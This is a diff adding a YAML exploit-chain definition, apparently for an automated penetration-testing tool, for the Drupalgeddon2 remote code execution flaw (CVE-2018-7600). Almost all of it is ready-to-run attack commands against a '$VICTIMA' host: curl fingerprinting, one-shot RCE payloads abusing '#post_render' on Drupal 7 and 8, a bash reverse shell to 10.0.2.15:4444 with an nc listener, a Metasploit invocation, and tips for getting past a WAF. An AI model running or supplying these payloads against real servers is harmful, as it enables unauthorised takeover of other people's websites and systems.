@@ -1,0 +1,66 @@
+chain_id: drupalgeddon2_cve_2018_7600
+title: "Drupal — Drupalgeddon2 (CVE-2018-7600) unauth RCE via Form API"
+severity: CRITICAL
+tags: [web, drupal, cve-2018-7600, drupalgeddon2, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2018-7600" }
+    - { banner_pattern: "(?i)drupal" }
+    - { product_pattern: "(?i)drupal" }
+    - { path_pattern: "(?i)/(user/(register|password)|node/add|drupal)" }
+
+description: |
+  Drupal 7.x < 7.58, 8.3.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1
+  evaluates renderable arrays from form input keys starting with `#`
+  (e.g. `#post_render`). Pointing `#post_render` at `passthru` and
+  feeding `#markup` as the command yields unauth RCE on
+  `/user/register?element_parents=account/mail/%23value&ajax_form=1`.
+
+steps:
+  - id: 1
+    title: "Fingerprint Drupal version (CHANGELOG.txt is canonical)"
+    command: |
+      curl -sk "http://$VICTIMA/CHANGELOG.txt" | head -1
+      curl -sk "http://$VICTIMA/core/CHANGELOG.txt" | head -1
+      curl -sk "http://$VICTIMA/" | grep -Ei 'drupal|generator'
+
+  - id: 2
+    title: "One-shot RCE (Drupal 7 endpoint)"
+    command: |
+      curl -sk "http://$VICTIMA/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
+        --data 'form_id=user_pass&_triggering_element_name=name'
+
+  - id: 3
+    title: "One-shot RCE (Drupal 8 endpoint)"
+    command: |
+      curl -sk "http://$VICTIMA/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
+        --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      curl -sk "http://$VICTIMA/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
+        --data-urlencode 'mail[#post_render][]=exec' \
+        --data-urlencode 'mail[#type]=markup' \
+        --data-urlencode 'mail[#markup]=bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"' \
+        --data 'form_id=user_register_form&_drupal_ajax=1'
+
+  - id: 5
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/unix/webapp/drupal_drupalgeddon2; \
+        set RHOSTS $VICTIMA; set TARGETURI /; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+common_errors:
+  - error: "Endpoint returns 404"
+    solution: |
+      Try the Drupal-7-only path `?q=user/password` with form_id
+      `user_pass`. If both fail, the box is patched or behind a WAF
+      stripping `#`. Try double-URL-encoding the brackets.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2018-7600
+  - https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/
